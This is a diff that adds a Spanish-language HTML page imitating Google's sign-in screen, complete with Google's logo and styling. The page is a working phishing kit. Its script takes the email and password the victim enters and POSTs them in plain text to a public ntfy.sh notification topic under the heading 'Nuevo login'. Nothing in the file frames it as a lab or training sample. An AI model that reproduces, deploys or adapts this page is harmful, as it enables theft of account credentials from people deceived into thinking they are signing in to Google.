@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Iniciar sesión - Google</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 40px 50px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      width: 360px;
+      text-align: center;
+    }
+    .login-container img {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-weight: 400;
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #202124;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 12px 10px;
+      margin: 8px 0 20px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease;
+    }
+    input[type="email"]:focus, input[type="password"]:focus {
+      border-color: #4285f4;
+      box-shadow: 0 0 5px #4285f4;
+    }
+    button {
+      background-color: #1a73e8;
+      border: none;
+      color: white;
+      padding: 12px 0;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: 500;
+    }
+    button:hover {
+      background-color: #1669c1;
+    }
+    .footer-text {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" />
+    <h1>Iniciar sesión</h1>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Correo electrónico o teléfono" required />
+      <input type="password" id="password" placeholder="Contraseña" required />
+      <button type="submit">Siguiente</button>
+    </form>
+    <div class="footer-text">¿Necesitas ayuda?</div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const mensaje = `📥 Nuevo login:\n📧 Email: ${email}\n🔒 Contraseña: ${password}`;
+
+      fetch('https://ntfy.sh/putaslocas', {
+        method: 'POST',
+        body: mensaje,
+        headers: {
+          'Title': 'Nuevo intento de login',
+          'Priority': 'high'
+        }
+      })
+      .then(response => {
+        if(response.ok) {
+          alert('✅ Enviado con éxito');
+        } else {
+          alert('❌ Error al enviar');
+        }
+      })
+      .catch(err => {
+        alert('❌ Error: ' + err.message);
+      });
+    });
+  </script>
+
+</body>
+</html>
